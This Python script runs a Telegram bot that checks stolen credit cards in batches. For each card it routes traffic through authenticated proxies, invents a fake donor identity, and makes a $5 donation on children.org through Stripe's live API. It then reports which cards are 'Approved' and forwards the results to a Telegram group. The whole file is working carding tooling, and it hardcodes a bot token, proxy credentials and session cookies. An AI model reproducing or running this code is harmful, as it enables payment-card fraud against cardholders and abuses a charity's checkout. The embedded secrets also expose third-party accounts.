import random
from curl_cffi import requests
from tools import Tools
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, filters,Application  # Cambiado 'Filters' por 'filters'

import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json

from curl_cffi import requests
from fake_useragent import UserAgent


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None
TOKEN = "8100331928:AAGO6_xdpBxx2h4zbjNmx9Sin0QLb9PHhzA"  # Reemplaza con tu token real

class PayMyFlow:
    @staticmethod
    def pc(card):
        max_retries = 15
        retry_count = 0
        while retry_count < max_retries:
        
                #============[Funcions Need]============#
                cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
                proxy = "geo.iproyal.com:12321"  # Dirección del proxy
                proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"  # Autenticación

                # Definir los proxies con autenticación
                proxy = {
                    "http": f"http://{proxy_auth}@{proxy}",
                    "https": f"http://{proxy_auth}@{proxy}",
                }
                cliente.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
                cc_number, mes, ano_number, cvv = card.split('|')
                if len(ano_number) == 2: ano_number = "20"+ano_number
                agente_user = UserAgent()

                #============[Address Found]============#
                name  = usuario()['name'].split(' ')[0]
                last  = usuario()['name'].split(' ')[1]
                email = usuario()['email']
                number = random.randint(1111, 9999)
                street = f"{name} street {number}"
                phone = usuario()['phone']


                

                

                #============[Requests 1]============#
                
                headers = {
                    'authority': 'www.children.org',
                    'accept': '*/*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; FPGSID=1.1741984694.1741984694.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; gtm_page_view=2; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984704.48.0.0; Cookie - Page Count=2; engagementcount=2; EPi_NumberOfVisits=16,2025-02-19T05:08:50,2025-02-19T05:08:52,2025-02-19T05:08:54,2025-02-19T05:08:58,2025-02-19T05:09:24,2025-02-19T05:10:30,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25; _clsk=1oxk4sc%7C1741984705276%7C2%7C1%7Ci.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741984706.0.0.950301738; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984705755|2|1|bat.bing.com/p/insights/c/i',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/make-a-difference/donate',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                data = {
                    'Amount': '5',
                    'ProductOptionId': '6',
                    'Description': 'Our mission',
                    'BlockGuid': 'd180694e-c81a-4dee-82a9-ab0e080e0883',
                }

                response = cliente.post('https://www.children.org/api/cart/add', headers=headers, data=data)


                headers = {
                    'authority': 'www.children.org',
                    'accept': '*/*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    # 'content-length': '0',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; FPGSID=1.1741984694.1741984694.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; gtm_page_view=2; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984704.48.0.0; Cookie - Page Count=2; engagementcount=2; _clsk=1oxk4sc%7C1741984705276%7C2%7C1%7Ci.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741984706.0.0.950301738; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984705755|2|1|bat.bing.com/p/insights/c/i; EPi_NumberOfVisits=17,2025-02-19T05:08:52,2025-02-19T05:08:54,2025-02-19T05:08:58,2025-02-19T05:09:24,2025-02-19T05:10:30,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/make-a-difference/donate',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                response = cliente.post('https://www.children.org/api/cart/getcartcount', headers=headers)

                headers = {
                    'authority': 'www.children.org',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; FPGSID=1.1741984694.1741984694.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; gtm_page_view=2; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984704.48.0.0; Cookie - Page Count=2; engagementcount=2; _clsk=1oxk4sc%7C1741984705276%7C2%7C1%7Ci.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741984706.0.0.950301738; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984705755|2|1|bat.bing.com/p/insights/c/i; EPi_NumberOfVisits=17,2025-02-19T05:08:52,2025-02-19T05:08:54,2025-02-19T05:08:58,2025-02-19T05:09:24,2025-02-19T05:10:30,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/make-a-difference/donate',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

                response = cliente.get('https://www.children.org/checkout',  headers=headers)
                print("pase le req de egregar")
                headers = {
                    'authority': 'www.children.org',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; engagementcount=2; gtm_page_view=3; pid=; BNES_pid=; Cookie - Page Count=3; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984796.59.0.1977592029; _clsk=1oxk4sc%7C1741984796608%7C3%7C1%7Ci.clarity.ms%2Fcollect; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984798402|3|1|bat.bing.com/p/insights/c/i; FPGSID=1.1741984694.1741985020.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; general_email_submitted=dssljwwsk@msn.com; EPi_NumberOfVisits=22,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55,2025-03-14T20:39:55,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:43:45; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741985041.0.0.950301738',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/checkout',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

                json_data = {
                    'addressLine1': 'Calle 67',
                    'addressLine2': '',
                    'city': 'Teabo',
                    'stateId': '96',
                    'postalCode': '97910',
                    'countryId': '148',
                }

                response = cliente.post(
                    'https://www.children.org/api/locations/validateAddress',
                    headers=headers,
                    json=json_data,
                )
                print("pase le req de direccion")
                headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'pragma': 'no-cache',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

                data = f'guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd&sid=36a4a8fe-b091-45e5-8412-81345f30407463f885&referrer=https%3A%2F%2Fwww.children.org&time_on_page=415337&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}&payment_user_agent=stripe.js%2Fbf449b81e7%3B+stripe-js-v3%2Fbf449b81e7%3B+split-card-element&pasted_fields=number&key=pk_live_51HgrtnHhxqq5H7ZZwjXhFZJ6zBol49y4PFaEvjAdxnBm8lbKIjrAwoGXsJ8lYS9oa2ZzHgDpxe1vHWca6V8y8SMI00NLIdGZFr'

                response = cliente.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
                responsePm = json.loads(response.text)
                token = responsePm['id']
                headers = {
                    'authority': 'www.children.org',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; engagementcount=2; gtm_page_view=3; pid=; BNES_pid=; Cookie - Page Count=3; _clsk=1oxk4sc%7C1741984796608%7C3%7C1%7Ci.clarity.ms%2Fcollect; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984798402|3|1|bat.bing.com/p/insights/c/i; FPGSID=1.1741984694.1741985020.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; EPi_NumberOfVisits=23,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55,2025-03-14T20:39:55,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:43:45,2025-03-14T20:44:08; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741985047.60.0.0; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741985047.0.0.950301738',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/checkout',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

                json_data = {
                    'Details': {
                        'address': {
                            'countryId': '148',
                            'zipCode': '97910',
                            'stateProvinceId': '96',
                            'address1': 'calle o242',
                            'address2': '',
                            'city': 'Teabo',
                            'stateProvince': 'YU',
                        },
                        'email': email,
                        'title': 'Mr.',
                        'firstName': name,
                        'lastName': last,
                        'phone': '9971556986',
                        'cellPhone': '5523699869',
                        'allowMobile': '',
                        'acceptedGDPR': False,
                        'gdprVersion': 0,
                        'allowEmail': '',
                        'currentCountry': {
                            'countryId': 148,
                            'countryAbbr': 'MX',
                            'displayName': 'Mexico',
                            'isPostalAware': True,
                        },
                        'currentState': {
                            'stateProvinceId': 96,
                            'stateProvinceAbbr': 'YU',
                            'displayName': 'Yucatan',
                            'countryId': 148,
                        },
                        'requiresAddressValidation': False,
                        'addressConfirmed': True,
                        'validAddress': True,
                    },
                    'CreditCardInfo': {
                        'cardType': 'MasterCard',
                        'lastFour': '5931',
                        'expirationMonth': mes,
                        'expirationYear': ano_number,
                        'cardNumber': token,
                        'nameOnCard': name+' '+last,
                        'saveCard': True,
                        'token': token,
                    },
                }

                responseChk = cliente.post('https://www.children.org/api/checkout',  headers=headers, json=json_data)
                soup = b(responseChk.text, 'html.parser')
                response_text = responseChk.text

                # Intentar parsear como JSON
                try:
                    response_data = json.loads(response_text)
                    
                    # Comprobar si hay errores
                    if response_data.get("HasErrors"):
                        # Si hay errores, obtener la lista de errores
                        errors = response_data.get("Errors", [])
                        if errors:
                            # Si hay errores, imprimir el primer error
                            print(f"Error: {errors[0]}")
                            return errors[0]
                        else:
                            print("Error desconocido.")
                            errordes="Error desconocido."
                            return errordes
                    else:
                        # Si no hay errores, verificar si el pago fue exitoso
                        if response_data.get("LineItems") and response_data["LineItems"][0].get("Paid"):
                            print("Approved.")
                            live="Approved."
                            return live
                        else:
                            print("Estado del pago desconocido.")
                            pagodes="Estado del pago desconocido."
                            return pagodes
                            
                except json.JSONDecodeError:
                    # Si no es JSON, intentamos parsear el HTML
                    soup = b(response_text, 'html.parser')
                    # Aquí puedes buscar algún mensaje de error específico en el HTML, por ejemplo:
                    error_message = soup.find('div', class_='error-message')
                    if error_message:
                        print(f"Error: {error_message.text.strip()}")
                    else:
                        print("No se pudo encontrar un mensaje de error.")
    


import asyncio
from telegram import Update
from telegram.ext import CallbackContext
async def b3(update: Update, context: CallbackContext):
    group_chat_id = 846983753  # Reemplaza con el ID del grupo donde quieres enviar los resultados

    # Obtener las tarjetas del mensaje separadas por espacio
    cards = context.args  

    if not cards:
        await update.message.reply_text(
            "⚠️ Por favor, envía entre 1 y 5 tarjetas en el formato:\n"
            "`CC|MES|AÑO|CVV`\n\nEjemplo:\n`/b3 4152313959165486|10|2027|448 4152313959165487|11|2028|123`",
            parse_mode="Markdown"
        )
        return

    if len(cards) > 10:
        await update.message.reply_text("🚫 Solo puedes enviar un máximo de *5 tarjetas* por mensaje.", parse_mode="Markdown")
        return

    # Enviar mensaje inicial de "procesando"
    processing_message = await update.message.reply_text("🔄 Procesando las tarjetas...")

    payflow = PayMyFlow()  # Instancia de la clase (si es necesario)
    results = []

    # Función para procesar cada tarjeta individualmente
    async def process_card(card):
        try:
            # Si payflow.pc() es async, usa `await`, de lo contrario, ejecútalo normalmente
            result = await payflow.pc(card) if callable(getattr(payflow.pc, "__await__", None)) else payflow.pc(card)
            return f"✅ CC: `{card}` → {result}"
        except ValueError as e:
            return f"❌ CC: `{card}` → Error: {str(e)}"

    # Ejecutar todas las tareas de forma concurrente usando asyncio.gather
    tasks = [process_card(card) for card in cards]
    results = await asyncio.gather(*tasks)

    # Formatear el mensaje final
    final_message = "💳 **Resultados del procesamiento:**\n\n" + "\n".join(results)

    # Editar el mensaje de procesamiento con los resultados
    await processing_message.edit_text(final_message, parse_mode="Markdown")

    # Enviar los resultados al grupo
    await context.bot.send_message(chat_id=group_chat_id, text=final_message, parse_mode="Markdown")


def main():
    application = Application.builder().token(TOKEN).build()  # Uso del nuevo 'Application'
    
    # Registramos los handlers
    
    application.add_handler(CommandHandler("cc", b3))  # Usamos CommandHandler para /cc
    
    # Iniciar el bot
    application.run_polling()

if __name__ == '__main__':
    main()